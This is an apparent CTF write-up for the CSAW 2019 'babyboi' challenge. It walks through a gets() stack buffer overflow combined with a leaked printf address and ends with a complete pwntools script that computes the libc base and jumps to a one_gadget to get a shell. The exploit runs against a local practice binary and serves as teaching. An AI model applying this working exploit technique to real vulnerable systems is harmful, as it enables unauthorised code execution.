---
search:
  exclude: true
---
# Csaw 2019 babyboi

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/csaw19_babyboi/baby_boi
    
    baby_boi                          100%[==========================================================>]   8.41K  --.-KB/s    in 0.001s
    
    2021-03-06 15:19:56 (16.1 MB/s) - ‘baby_boi’ saved [8608/8608]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/csaw19_babyboi/baby_boi.c
    
    baby_boi.c                        100%[==========================================================>]     274  --.-KB/s    in 0s
    
    2021-03-06 15:20:10 (27.1 MB/s) - ‘baby_boi.c’ saved [274/274]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/csaw19_babyboi/libc-2.27.so
    
    libc-2.27.so                      100%[==========================================================>]   1.94M  2.79MB/s    in 0.7s
    
    2021-03-06 15:20:19 (2.79 MB/s) - ‘libc-2.27.so’ saved [2030544/2030544]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → file baby_boi
    baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → chmod +x baby_boi
    
    

` ![]()

## Solution 

first let's run the binary to see what it does:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → ./baby_boi
    Hello!
    Here I am: 0x7f158ee88590
    ok
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → ./baby_boi
    Hello!
    Here I am: 0x7f7090800590
    hello
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → ./baby_boi
    Hello!
    Here I am: 0x7f4a5ed57590
    bye
    
    

The binary basically outputs some text, then it lekas some memorya ddress, and then lets us put in some text. Let's run pwn checksec on it and check what are the other files about:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → pwn checksec baby_boi
    [*] '/home/nothing/binexp/2/bboi/baby_boi'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → cat baby_boi.c
    #include 
    #include 
    
    int main(int argc, char **argv[]) {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    
      char buf[32];
      printf("Hello!\n");
      printf("Here I am: %p\n", printf);
      gets(buf);
    }
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → ./libc-2.27.so
    zsh: permission denied: ./libc-2.27.so
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → chmod +x libc-2.27.so
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → ./libc-2.27.so
    Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
    
    
    

Now here we see that the binary just prompts us for text, and looking at the sourcecode, we see that it prints the libc address for printf. After that, it makes a **gets** call on a fixed size buffer of 32 bytes (0x20 bytes) so this means that we have a buffer overflow. We also see that the libc version is **2.27** The only binary protection that we have is NX.

To exploit this, we will use the buffer overflow vulnerability we just mentionned, and then we will call a oneshot gadget, which is a single ROP gadget in the libc library that will call **execve("/bin/sh")** given the right conditions, we find this using the [one_gadget](https://github.com/david942j/one_gadget) utility:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [~]
    → sudo pacman -S rubygems
    [sudo] password for nothing:
    warning: rubygems-3.2.13-1 is up to date -- reinstalling
    resolving dependencies...
    looking for conflicting packages...
    
    Package (1)     Old Version  New Version  Net Change
    
    extra/rubygems  3.2.13-1     3.2.13-1       0.00 MiB
    
    Total Installed Size:  0.92 MiB
    Net Upgrade Size:      0.00 MiB
    
    :: Proceed with installation? [Y/n] y
    (1/1) checking keys in keyring                                                  [----------------------------------------------] 100%
    (1/1) checking package integrity                                                [----------------------------------------------] 100%
    (1/1) loading package files                                                     [----------------------------------------------] 100%
    (1/1) checking for file conflicts                                               [----------------------------------------------] 100%
    (1/1) checking available disk space                                             [----------------------------------------------] 100%
    :: Processing package changes...
    (1/1) reinstalling rubygems                                                     [----------------------------------------------] 100%
    :: Running post-transaction hooks...
    (1/1) Arming ConditionNeedsUpdate...
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [~]
    → gem install one_gadget
    Fetching one_gadget-1.7.4.gem
    Fetching bindata-2.4.8.gem
    Fetching elftools-1.1.3.gem
    WARNING:  You don't have /home/nothing/.local/share/gem/ruby/2.7.0/bin in your PATH,
              gem executables will not run.
    Successfully installed bindata-2.4.8
    Successfully installed elftools-1.1.3
    Successfully installed one_gadget-1.7.4
    3 gems installed
    
    

Here for some reason the binary to run one_gadget isn't in my $PATH so i have to make a symlink to it:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/19 ] [~]
    → sudo updatedb;locate one_gadget | grep 'gadget$'
    /home/nothing/.local/share/gem/ruby/2.7.0/bin/one_gadget
    /home/nothing/.local/share/gem/ruby/2.7.0/gems/one_gadget-1.7.4/bin/one_gadget
    /home/nothing/.local/share/gem/ruby/2.7.0/gems/one_gadget-1.7.4/lib/one_gadget
    
    [ 192.168.0.18/24 ] [ /dev/pts/19 ] [~]
    → /home/nothing/.local/share/gem/ruby/2.7.0/bin/one_gadget
    Usage: one_gadget  [options]
        -b, --build-id BuildID           BuildID[sha1] of libc.
        -f, --[no-]force-file            Force search gadgets in file instead of build id first.
        -l, --level OUTPUT_LEVEL         The output level.
                                         OneGadget automatically selects gadgets with higher successful probability.
                                         Increase this level to ask OneGadget show more gadgets it found.
                                         Default: 0
        -n, --near FUNCTIONS/FILE        Order gadgets by their distance to the given functions or to the GOT functions of the given file.
        -r, --[no-]raw                   Output gadgets offset only, split with one space.
        -s, --script exploit-script      Run exploit script with all possible gadgets.
                                         The script will be run as 'exploit-script $offset'.
            --info BuildID               Show version information given BuildID.
            --base BASE_ADDRESS          The base address of libc.
                                         Default: 0
            --version                    Current gem version.
    
    [ 192.168.0.18/24 ] [ /dev/pts/21 ] [~]
    → echo $PATH
    /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/var/lib/snapd/snap/bin
    
    [ 192.168.0.18/24 ] [ /dev/pts/19 ] [~]
    → sudo ln -s  /home/nothing/.local/share/gem/ruby/2.7.0/bin/one_gadget /usr/local/bin/one_gadget
    
    [ 192.168.0.18/24 ] [ /dev/pts/19 ] [~]
    → zsh
    
    [ 192.168.0.18/24 ] [ /dev/pts/19 ] [~]
    → one_gadget
    Usage: one_gadget  [options]
        -b, --build-id BuildID           BuildID[sha1] of libc.
        -f, --[no-]force-file            Force search gadgets in file instead of build id first.
        -l, --level OUTPUT_LEVEL         The output level.
                                         OneGadget automatically selects gadgets with higher successful probability.
                                         Increase this level to ask OneGadget show more gadgets it found.
                                         Default: 0
        -n, --near FUNCTIONS/FILE        Order gadgets by their distance to the given functions or to the GOT functions of the given file.
        -r, --[no-]raw                   Output gadgets offset only, split with one space.
        -s, --script exploit-script      Run exploit script with all possible gadgets.
                                         The script will be run as 'exploit-script $offset'.
            --info BuildID               Show version information given BuildID.
            --base BASE_ADDRESS          The base address of libc.
                                         Default: 0
            --version                    Current gem version.
    
    
    

Now that's done, let's run one_gadget on the libc library:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → one_gadget libc-2.27.so
    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
    
    0x4f322 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    
    0x10a38c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    
    

So here we see that we can leverage the libc infoleak with the printf statement to the libc printf which we know the libc version, we know the address space of the libc. For which onegadget to pick, it's usually trial and error to see what conditions will work. So let's make our exploit as follows:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/bboi]
    → vim exploit.py
    
    
    
    
    from pwn import *
    
    # Establish the target
    target = process('./baby_boi', env={"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF('libc-2.27.so')
    
    print(target.recvuntil("ere I am: "))
    
    # Scan in the infoleak
    leak = target.recvline()
    leak = leak.strip(b"\n")
    
    base = int(leak, 16) - libc.symbols['printf']
    
    print("wooo:" + hex(base))
    
    # Calculate oneshot gadget
    oneshot = base + 0x4f322
    
    payload = b""
    payload += b"\x00"*0x28         # Offset to oneshot gadget
    payload += p64(oneshot)     # Oneshot gadget
    
    # Send the payload
    target.sendline(payload)
    
    target.interactive()
    
    

Now execute it and we see the following:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/1 ] [binexp/2/bboi]
    → python3 exploit.py
    [+] Starting local process './baby_boi': pid 540529
    [*] '/home/nothing/binexp/2/bboi/libc-2.27.so'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    Hello!
    Here I am:
    wooo:0x7fedeb22e012
    [*] Switching to interactive mode
    $ cat flag.txt
    flag{baby_boi_dodooo_doo_doo_dooo}
    

And that's it! we have been able to spawn a shell and print out the flag.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

